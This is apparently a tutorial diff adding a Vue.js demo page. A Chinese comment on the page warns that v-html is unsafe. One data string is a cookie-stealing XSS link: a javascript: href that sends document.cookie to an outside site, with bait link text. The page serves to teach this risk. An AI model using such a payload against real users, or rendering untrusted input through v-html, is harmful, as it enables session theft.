@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+</head>
+
+<body>
+    <!-- 
+        注意v-html有安全性的问题
+     -->
+    <div id="root">
+        <div>你好,{{name}}</div>
+        <div v-html="name"></div>
+        <div v-html="str"></div>
+    </div>
+
+    <script>
+        new Vue({
+            el: '#root',
+            data() {
+                return {
+                    name: '<h1>abc</h1>',
+                    str: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>这里有你想看的，好康的哦~</a>'
+                }
+            },
+        })
+    </script>
+
+</body>
+
+</html>
